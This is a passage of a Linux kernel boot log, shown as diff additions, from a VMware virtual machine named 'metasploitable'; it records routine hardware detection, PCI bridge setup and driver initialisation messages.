+Sep 13 17:20:26 metasploitable kernel: [    8.146290] CPU: L2 cache: 256K
+Sep 13 17:20:26 metasploitable kernel: [    8.146302] CPU: L3 cache: 8192K
+Sep 13 17:20:26 metasploitable kernel: [    8.146565] Compat vDSO mapped to ffffe000.
+Sep 13 17:20:26 metasploitable kernel: [    8.146693] Checking 'hlt' instruction... OK.
+Sep 13 17:20:26 metasploitable kernel: [    8.195365] SMP alternatives: switching to UP code
+Sep 13 17:20:26 metasploitable kernel: [    8.265567] Early unpacking initramfs... done
+Sep 13 17:20:26 metasploitable kernel: [    8.635675] ACPI: Core revision 20070126
+Sep 13 17:20:26 metasploitable kernel: [    8.635832] ACPI: Looking for DSDT in initramfs... error, file /DSDT.aml not found.
+Sep 13 17:20:26 metasploitable kernel: [    8.646074] CPU0: Intel(R) Core(TM) i7-8650U CPU @ 1.90GHz stepping 0a
+Sep 13 17:20:26 metasploitable kernel: [    8.646247] SMP alternatives: switching to SMP code
+Sep 13 17:20:26 metasploitable kernel: [    8.665598] Booting processor 1/1 eip 3000
+Sep 13 17:20:26 metasploitable kernel: [    8.676540] Initializing CPU#1
+Sep 13 17:20:26 metasploitable kernel: [    8.825753] Calibrating delay using timer specific routine.. 4233.58 BogoMIPS (lpj=21167937)
+Sep 13 17:20:26 metasploitable kernel: [    8.826258] CPU: L1 I cache: 32K, L1 D cache: 32K
+Sep 13 17:20:26 metasploitable kernel: [    8.826279] CPU: L2 cache: 256K
+Sep 13 17:20:26 metasploitable kernel: [    8.826299] CPU: L3 cache: 8192K
+Sep 13 17:20:26 metasploitable kernel: [    8.826612] CPU1: Intel(R) Core(TM) i7-8650U CPU @ 1.90GHz stepping 0a
+Sep 13 17:20:26 metasploitable kernel: [    8.826768] Total of 2 processors activated (8559.09 BogoMIPS).
+Sep 13 17:20:26 metasploitable kernel: [    8.826925] ENABLING IO-APIC IRQs
+Sep 13 17:20:26 metasploitable kernel: [    8.827342] ..TIMER: vector=0x31 apic1=0 pin1=2 apic2=-1 pin2=-1
+Sep 13 17:20:26 metasploitable kernel: [    9.047062] checking TSC synchronization [CPU#0 -> CPU#1]: passed.
+Sep 13 17:20:26 metasploitable kernel: [    9.067401] Brought up 2 CPUs
+Sep 13 17:20:26 metasploitable kernel: [    9.068969] net_namespace: 64 bytes
+Sep 13 17:20:26 metasploitable kernel: [    9.068986] Booting paravirtualized kernel on bare hardware
+Sep 13 17:20:26 metasploitable kernel: [    9.069807] Time: 21:19:54  Date: 09/13/26
+Sep 13 17:20:26 metasploitable kernel: [    9.069905] NET: Registered protocol family 16
+Sep 13 17:20:26 metasploitable kernel: [    9.071498] EISA bus registered
+Sep 13 17:20:26 metasploitable kernel: [    9.071512] ACPI: bus type pci registered
+Sep 13 17:20:26 metasploitable kernel: [    9.072177] PCI: PCI BIOS revision 2.10 entry at 0xfd8a0, last bus=34
+Sep 13 17:20:26 metasploitable kernel: [    9.072190] PCI: Using configuration type 1
+Sep 13 17:20:26 metasploitable kernel: [    9.072202] Setting up standard PCI resources
+Sep 13 17:20:26 metasploitable kernel: [    9.079972] ACPI: BIOS _OSI(Linux) query ignored
+Sep 13 17:20:26 metasploitable kernel: [    9.079992] ACPI: DMI System Vendor: VMware, Inc.
+Sep 13 17:20:26 metasploitable kernel: [    9.080004] ACPI: DMI Product Name: VMware Virtual Platform
+Sep 13 17:20:26 metasploitable kernel: [    9.080015] ACPI: DMI Product Version: None
+Sep 13 17:20:26 metasploitable kernel: [    9.080026] ACPI: DMI Board Name: 440BX Desktop Reference Platform
+Sep 13 17:20:26 metasploitable kernel: [    9.080038] ACPI: DMI BIOS Vendor: Phoenix Technologies LTD
+Sep 13 17:20:26 metasploitable kernel: [    9.080049] ACPI: DMI BIOS Date: 11/12/2020
+Sep 13 17:20:26 metasploitable kernel: [    9.080060] ACPI: Please send DMI info above to linux-acpi@vger.kernel.org
+Sep 13 17:20:26 metasploitable kernel: [    9.080072] ACPI: If "acpi_osi=Linux" works better, please notify linux-acpi@vger.kernel.org
+Sep 13 17:20:26 metasploitable kernel: [    9.080235] ACPI: Interpreter enabled
+Sep 13 17:20:26 metasploitable kernel: [    9.080253] ACPI: (supports S0 S1 S4 S5)
+Sep 13 17:20:26 metasploitable kernel: [    9.080273] ACPI: Using IOAPIC for interrupt routing
+Sep 13 17:20:26 metasploitable kernel: [    9.088291] ACPI: PCI Root Bridge [PCI0] (0000:00)
+Sep 13 17:20:26 metasploitable kernel: [    9.089003] PCI quirk: region 1000-103f claimed by PIIX4 ACPI
+Sep 13 17:20:26 metasploitable kernel: [    9.089046] PCI quirk: region 1040-104f claimed by PIIX4 SMB
+Sep 13 17:20:26 metasploitable kernel: [    9.091121] PCI: Transparent bridge - 0000:00:11.0
+Sep 13 17:20:26 metasploitable kernel: [    9.103771] ACPI: PCI Interrupt Link [LNKA] (IRQs 3 4 5 6 7 *9 10 11 14 15)
+Sep 13 17:20:26 metasploitable kernel: [    9.103776] ACPI: PCI Interrupt Link [LNKB] (IRQs 3 4 5 6 7 9 10 *11 14 15)
+Sep 13 17:20:26 metasploitable kernel: [    9.103781] ACPI: PCI Interrupt Link [LNKC] (IRQs 3 4 5 6 7 9 *10 11 14 15)
+Sep 13 17:20:26 metasploitable kernel: [    9.103786] ACPI: PCI Interrupt Link [LNKD] (IRQs 3 4 *5 6 7 9 10 11 14 15)
+Sep 13 17:20:26 metasploitable kernel: [    9.103885] Linux Plug and Play Support v0.97 (c) Adam Belay
+Sep 13 17:20:26 metasploitable kernel: [    9.103937] pnp: PnP ACPI init
+Sep 13 17:20:26 metasploitable kernel: [    9.103942] ACPI: bus type pnp registered
+Sep 13 17:20:26 metasploitable kernel: [    9.104657] pnp: PnP ACPI: found 13 devices
+Sep 13 17:20:26 metasploitable kernel: [    9.104662] ACPI: ACPI bus type pnp unregistered
+Sep 13 17:20:26 metasploitable kernel: [    9.104667] PnPBIOS: Disabled by ACPI PNP
+Sep 13 17:20:26 metasploitable kernel: [    9.105102] PCI: Using ACPI for IRQ routing
+Sep 13 17:20:26 metasploitable kernel: [    9.105107] PCI: If a device doesn't work, try "pci=routeirq".  If it helps, post a report
+Sep 13 17:20:26 metasploitable kernel: [    9.105922] Clocksource tsc unstable (delta = -497629565 ns)
+Sep 13 17:20:26 metasploitable kernel: [    9.106500] NET: Registered protocol family 8
+Sep 13 17:20:26 metasploitable kernel: [    9.106504] NET: Registered protocol family 20
+Sep 13 17:20:26 metasploitable kernel: [    9.106556] NetLabel: Initializing
+Sep 13 17:20:26 metasploitable kernel: [    9.106561] NetLabel:  domain hash size = 128
+Sep 13 17:20:26 metasploitable kernel: [    9.106566] NetLabel:  protocols = UNLABELED CIPSOv4
+Sep 13 17:20:26 metasploitable kernel: [    9.106571] NetLabel:  unlabeled traffic allowed by default
+Sep 13 17:20:26 metasploitable kernel: [    9.106575] AppArmor: AppArmor Filesystem Enabled
+Sep 13 17:20:26 metasploitable kernel: [    9.106699] system 00:01: ioport range 0x1000-0x103f has been reserved
+Sep 13 17:20:26 metasploitable kernel: [    9.106703] system 00:01: ioport range 0x1040-0x104f has been reserved
+Sep 13 17:20:26 metasploitable kernel: [    9.106708] system 00:01: ioport range 0xcf0-0xcf1 has been reserved
+Sep 13 17:20:26 metasploitable kernel: [    9.106713] system 00:0c: ioport range 0xfce0-0xfcff has been reserved
+Sep 13 17:20:26 metasploitable kernel: [    9.106718] system 00:0c: iomem range 0xe0000000-0xe7ffffff could not be reserved
+Sep 13 17:20:26 metasploitable kernel: [    9.106722] system 00:0c: iomem range 0xfe800000-0xfe9fffff has been reserved
+Sep 13 17:20:26 metasploitable kernel: [    9.137346] PCI: Bridge: 0000:00:01.0
+Sep 13 17:20:26 metasploitable kernel: [    9.137351]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137356]   MEM window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137360]   PREFETCH window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137365] PCI: Bridge: 0000:00:11.0
+Sep 13 17:20:26 metasploitable kernel: [    9.137370]   IO window: 2000-3fff
+Sep 13 17:20:26 metasploitable kernel: [    9.137375]   MEM window: ef500000-efffffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137379]   PREFETCH window: dfb00000-dfffffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137384] PCI: Bridge: 0000:00:15.0
+Sep 13 17:20:26 metasploitable kernel: [    9.137389]   IO window: 4000-4fff
+Sep 13 17:20:26 metasploitable kernel: [    9.137394]   MEM window: ef400000-ef4fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137398]   PREFETCH window: dfa00000-dfafffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137403] PCI: Bridge: 0000:00:15.1
+Sep 13 17:20:26 metasploitable kernel: [    9.137408]   IO window: 8000-8fff
+Sep 13 17:20:26 metasploitable kernel: [    9.137412]   MEM window: ef000000-ef0fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137417]   PREFETCH window: df600000-df6fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137422] PCI: Bridge: 0000:00:15.2
+Sep 13 17:20:26 metasploitable kernel: [    9.137427]   IO window: c000-cfff
+Sep 13 17:20:26 metasploitable kernel: [    9.137431]   MEM window: eec00000-eecfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137436]   PREFETCH window: df200000-df2fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137441] PCI: Bridge: 0000:00:15.3
+Sep 13 17:20:26 metasploitable kernel: [    9.137446]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137450]   MEM window: ee800000-ee8fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137455]   PREFETCH window: dee00000-deefffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137460] PCI: Bridge: 0000:00:15.4
+Sep 13 17:20:26 metasploitable kernel: [    9.137465]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137469]   MEM window: ee400000-ee4fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137474]   PREFETCH window: dea00000-deafffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137479] PCI: Bridge: 0000:00:15.5
+Sep 13 17:20:26 metasploitable kernel: [    9.137484]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137488]   MEM window: ee000000-ee0fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137493]   PREFETCH window: de600000-de6fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137498] PCI: Bridge: 0000:00:15.6
+Sep 13 17:20:26 metasploitable kernel: [    9.137502]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137507]   MEM window: edc00000-edcfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137512]   PREFETCH window: de200000-de2fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137517] PCI: Bridge: 0000:00:15.7
+Sep 13 17:20:26 metasploitable kernel: [    9.137521]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137526]   MEM window: ed800000-ed8fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137531]   PREFETCH window: dde00000-ddefffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137536] PCI: Bridge: 0000:00:16.0
+Sep 13 17:20:26 metasploitable kernel: [    9.137540]   IO window: 5000-5fff
+Sep 13 17:20:26 metasploitable kernel: [    9.137545]   MEM window: ef300000-ef3fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137550]   PREFETCH window: df900000-df9fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137555] PCI: Bridge: 0000:00:16.1
+Sep 13 17:20:26 metasploitable kernel: [    9.137559]   IO window: 9000-9fff
+Sep 13 17:20:26 metasploitable kernel: [    9.137564]   MEM window: eef00000-eeffffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137569]   PREFETCH window: df500000-df5fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137574] PCI: Bridge: 0000:00:16.2
+Sep 13 17:20:26 metasploitable kernel: [    9.137578]   IO window: d000-dfff
+Sep 13 17:20:26 metasploitable kernel: [    9.137583]   MEM window: eeb00000-eebfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137588]   PREFETCH window: df100000-df1fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137592] PCI: Bridge: 0000:00:16.3
+Sep 13 17:20:26 metasploitable kernel: [    9.137597]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137602]   MEM window: ee700000-ee7fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137607]   PREFETCH window: ded00000-dedfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137611] PCI: Bridge: 0000:00:16.4
+Sep 13 17:20:26 metasploitable kernel: [    9.137616]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137621]   MEM window: ee300000-ee3fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137626]   PREFETCH window: de900000-de9fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137630] PCI: Bridge: 0000:00:16.5
+Sep 13 17:20:26 metasploitable kernel: [    9.137635]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137640]   MEM window: edf00000-edffffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137645]   PREFETCH window: de500000-de5fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137649] PCI: Bridge: 0000:00:16.6
+Sep 13 17:20:26 metasploitable kernel: [    9.137654]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137659]   MEM window: edb00000-edbfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137664]   PREFETCH window: de100000-de1fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137668] PCI: Bridge: 0000:00:16.7
+Sep 13 17:20:26 metasploitable kernel: [    9.137673]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137678]   MEM window: ed700000-ed7fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137687] Time: acpi_pm clocksource has been installed.
+Sep 13 17:20:26 metasploitable kernel: [    9.137725]   PREFETCH window: ddd00000-dddfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137730] PCI: Bridge: 0000:00:17.0
+Sep 13 17:20:26 metasploitable kernel: [    9.137735]   IO window: 6000-6fff
+Sep 13 17:20:26 metasploitable kernel: [    9.137739]   MEM window: ef200000-ef2fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137744]   PREFETCH window: df800000-df8fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137749] PCI: Bridge: 0000:00:17.1
+Sep 13 17:20:26 metasploitable kernel: [    9.137754]   IO window: a000-afff
+Sep 13 17:20:26 metasploitable kernel: [    9.137758]   MEM window: eee00000-eeefffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137763]   PREFETCH window: df400000-df4fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137768] PCI: Bridge: 0000:00:17.2
+Sep 13 17:20:26 metasploitable kernel: [    9.137772]   IO window: e000-efff
+Sep 13 17:20:26 metasploitable kernel: [    9.137777]   MEM window: eea00000-eeafffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137782]   PREFETCH window: df000000-df0fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137787] PCI: Bridge: 0000:00:17.3
+Sep 13 17:20:26 metasploitable kernel: [    9.137791]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137796]   MEM window: ee600000-ee6fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137801]   PREFETCH window: dec00000-decfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137806] PCI: Bridge: 0000:00:17.4
+Sep 13 17:20:26 metasploitable kernel: [    9.137810]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137815]   MEM window: ee200000-ee2fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137820]   PREFETCH window: de800000-de8fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137825] PCI: Bridge: 0000:00:17.5
+Sep 13 17:20:26 metasploitable kernel: [    9.137829]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137834]   MEM window: ede00000-edefffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137839]   PREFETCH window: de400000-de4fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137844] PCI: Bridge: 0000:00:17.6
+Sep 13 17:20:26 metasploitable kernel: [    9.137848]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137853]   MEM window: eda00000-edafffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137858]   PREFETCH window: de000000-de0fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137862] PCI: Bridge: 0000:00:17.7
+Sep 13 17:20:26 metasploitable kernel: [    9.137867]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137872]   MEM window: ed600000-ed6fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137877]   PREFETCH window: ddc00000-ddcfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137881] PCI: Bridge: 0000:00:18.0
+Sep 13 17:20:26 metasploitable kernel: [    9.137886]   IO window: 7000-7fff
+Sep 13 17:20:26 metasploitable kernel: [    9.137891]   MEM window: ef100000-ef1fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137896]   PREFETCH window: df700000-df7fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137910] PCI: Bridge: 0000:00:18.1
+Sep 13 17:20:26 metasploitable kernel: [    9.137919]   IO window: b000-bfff
+Sep 13 17:20:26 metasploitable kernel: [    9.137938]   MEM window: eed00000-eedfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137948]   PREFETCH window: df300000-df3fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137952] PCI: Bridge: 0000:00:18.2
+Sep 13 17:20:26 metasploitable kernel: [    9.137957]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137962]   MEM window: ee900000-ee9fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137967]   PREFETCH window: def00000-deffffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137971] PCI: Bridge: 0000:00:18.3
+Sep 13 17:20:26 metasploitable kernel: [    9.137976]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.137981]   MEM window: ee500000-ee5fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137986]   PREFETCH window: deb00000-debfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.137990] PCI: Bridge: 0000:00:18.4
+Sep 13 17:20:26 metasploitable kernel: [    9.137995]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.138000]   MEM window: ee100000-ee1fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.138005]   PREFETCH window: de700000-de7fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.138009] PCI: Bridge: 0000:00:18.5
+Sep 13 17:20:26 metasploitable kernel: [    9.138014]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.138019]   MEM window: edd00000-eddfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.138024]   PREFETCH window: de300000-de3fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.138028] PCI: Bridge: 0000:00:18.6
+Sep 13 17:20:26 metasploitable kernel: [    9.138033]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.138038]   MEM window: ed900000-ed9fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.138042]   PREFETCH window: ddf00000-ddffffff
+Sep 13 17:20:26 metasploitable kernel: [    9.138047] PCI: Bridge: 0000:00:18.7
+Sep 13 17:20:26 metasploitable kernel: [    9.138052]   IO window: disabled.
+Sep 13 17:20:26 metasploitable kernel: [    9.138057]   MEM window: ed500000-ed5fffff
+Sep 13 17:20:26 metasploitable kernel: [    9.138061]   PREFETCH window: ddb00000-ddbfffff
+Sep 13 17:20:26 metasploitable kernel: [    9.138303] NET: Registered protocol family 2
+Sep 13 17:20:26 metasploitable kernel: [    9.859440] IP route cache hash table entries: 32768 (order: 5, 131072 bytes)
+Sep 13 17:20:26 metasploitable kernel: [    9.863023] TCP established hash table entries: 131072 (order: 8, 1048576 bytes)
+Sep 13 17:20:26 metasploitable kernel: [    9.908987] TCP bind hash table entries: 65536 (order: 7, 524288 bytes)
+Sep 13 17:20:26 metasploitable kernel: [    9.914580] TCP: Hash tables configured (established 131072 bind 65536)
+Sep 13 17:20:26 metasploitable kernel: [    9.914606] TCP reno registered
+Sep 13 17:20:26 metasploitable kernel: [   10.007754] checking if image is initramfs... it is
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] Freeing initrd memory: 7743k freed
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] Simple Boot Flag at 0x36 set to 0x1
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] audit: initializing netlink socket (disabled)
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] audit(1789334396.253:1): initialized
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] highmem bounce pool size: 64 pages
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] Total HugeTLB memory allocated, 0
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] VFS: Disk quotas dquot_6.5.1
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] Dquot-cache hash table entries: 1024 (order 0, 4096 bytes)
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] io scheduler noop registered
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] io scheduler anticipatory registered
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] io scheduler deadline registered (default)
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] io scheduler cfq registered
+Sep 13 17:20:26 metasploitable kernel: [   11.101839] Limiting direct PCI/PCI transfers.
+Sep 13 17:20:26 metasploitable kernel: [   11.605140] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.610474] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.657492] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.662602] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.667119] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.705537] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.709943] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.715637] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.754663] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.759773] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.764822] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.802902] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.807948] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.814097] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.818782] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.856539] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.861057] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.865672] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.903718] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.908238] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.913827] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.918350] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.956011] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.960881] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   11.965425] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   12.003117] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   12.007444] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   12.012865] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   12.017320] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   12.056318] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   12.061406] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   12.066029] assign_interrupt_mode Found MSI capability
+Sep 13 17:20:26 metasploitable kernel: [   12.105390] isapnp: Scanning for PnP cards...
+Sep 13 17:20:26 metasploitable kernel: [   13.359014] isapnp: No Plug & Play device found
+Sep 13 17:20:26 metasploitable kernel: [   14.161437] Real Time Clock Driver v1.12ac
+Sep 13 17:20:26 metasploitable kernel: [   14.163005] Serial: 8250/16550 driver $Revision: 1.90 $ 4 ports, IRQ sharing enabled
+Sep 13 17:20:26 metasploitable kernel: [   14.164023] serial8250: ttyS0 at I/O 0x3f8 (irq = 4) is a 16550A
+Sep 13 17:20:26 metasploitable kernel: [   14.164764] serial8250: ttyS1 at I/O 0x2f8 (irq = 3) is a 16550A
+Sep 13 17:20:26 metasploitable kernel: [   14.167636] 00:09: ttyS0 at I/O 0x3f8 (irq = 4) is a 16550A
+Sep 13 17:20:26 metasploitable kernel: [   14.169476] 00:0a: ttyS1 at I/O 0x2f8 (irq = 3) is a 16550A
+Sep 13 17:20:26 metasploitable kernel: [   14.212067] RAMDISK driver initialized: 16 RAM disks of 65536K size 1024 blocksize
+Sep 13 17:20:26 metasploitable kernel: [   14.212677] input: Macintosh mouse button emulation as /devices/virtual/input/input0
+Sep 13 17:20:26 metasploitable kernel: [   14.213716] PNP: PS/2 Controller [PNP0303:KBC,PNP0f13:MOUS] at 0x60,0x64 irq 1,12
+Sep 13 17:20:26 metasploitable kernel: [   14.216459] serio: i8042 KBD port at 0x60,0x64 irq 1
+Sep 13 17:20:26 metasploitable kernel: [   14.216584] serio: i8042 AUX port at 0x60,0x64 irq 12
+Sep 13 17:20:26 metasploitable kernel: [   14.362239] mice: PS/2 mouse device common for all mice
+Sep 13 17:20:26 metasploitable kernel: [   14.364151] EISA: Probing bus 0 at eisa.0
+Sep 13 17:20:26 metasploitable kernel: [   14.364240] Cannot allocate resource for EISA slot 1
+Sep 13 17:20:26 metasploitable kernel: [   14.364257] Cannot allocate resource for EISA slot 2
+Sep 13 17:20:26 metasploitable kernel: [   14.364273] Cannot allocate resource for EISA slot 3
+Sep 13 17:20:26 metasploitable kernel: [   14.364289] Cannot allocate resource for EISA slot 4
+Sep 13 17:20:26 metasploitable kernel: [   14.364305] Cannot allocate resource for EISA slot 5
+Sep 13 17:20:26 metasploitable kernel: [   14.364321] Cannot allocate resource for EISA slot 6
+Sep 13 17:20:26 metasploitable kernel: [   14.364337] Cannot allocate resource for EISA slot 7
+Sep 13 17:20:26 metasploitable kernel: [   14.364402] Cannot allocate resource for EISA slot 8
+Sep 13 17:20:26 metasploitable kernel: [   14.364418] EISA: Detected 0 cards.
+Sep 13 17:20:26 metasploitable kernel: [   14.364435] cpuidle: using governor ladder
+Sep 13 17:20:26 metasploitable kernel: [   14.364451] cpuidle: using governor menu
+Sep 13 17:20:26 metasploitable kernel: [   14.364742] NET: Registered protocol family 1
+Sep 13 17:20:26 metasploitable kernel: [   14.364965] Using IPI No-Shortcut mode
+Sep 13 17:20:26 metasploitable kernel: [   14.365042] registered taskstats version 1
+Sep 13 17:20:26 metasploitable kernel: [   14.365544]   Magic number: 10:495:348
+Sep 13 17:20:26 metasploitable kernel: [   14.365642]   hash matches device 0000:00:16.1:pcie02
+Sep 13 17:20:26 metasploitable kernel: [   14.365723] BIOS EDD facility v0.16 2004-Jun-25, 6 devices found
+Sep 13 17:20:26 metasploitable kernel: [   14.366229] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
+Sep 13 17:20:26 metasploitable kernel: [   14.369169] Freeing unused kernel memory: 384k freed
+Sep 13 17:20:26 metasploitable kernel: [   15.819363] fuse init (API version 7.9)
+Sep 13 17:20:26 metasploitable kernel: [   16.019809] device-mapper: uevent: version 1.0.3
+Sep 13 17:20:26 metasploitable kernel: [   16.020103] device-mapper: ioctl: 4.12.0-ioctl (2007-10-02) initialised: dm-devel@redhat.com
+Sep 13 17:20:26 metasploitable kernel: [   17.164633] SCSI subsystem initialized
+Sep 13 17:20:26 metasploitable kernel: [   17.169634] Fusion MPT base driver 3.04.06
+Sep 13 17:20:26 metasploitable kernel: [   17.169649] Copyright (c) 1999-2007 LSI Corporation
+Sep 13 17:20:26 metasploitable kernel: [   17.214185] Fusion MPT SPI Host driver 3.04.06
+Sep 13 17:20:26 metasploitable kernel: [   17.214438] ACPI: PCI Interrupt 0000:00:10.0[A] -> GSI 17 (level, low) -> IRQ 16
+Sep 13 17:20:26 metasploitable kernel: [   17.214615] mptbase: ioc0: Initiating bringup
+Sep 13 17:20:26 metasploitable kernel: [   17.325807] usbcore: registered new interface driver usbfs
+Sep 13 17:20:26 metasploitable kernel: [   17.325840] usbcore: registered new interface driver hub
+Sep 13 17:20:26 metasploitable kernel: [   17.326159] usbcore: registered new device driver usb
+Sep 13 17:20:26 metasploitable kernel: [   17.363494] pcnet32.c:v1.34 14.Aug.2007 tsbogend@alpha.franken.de
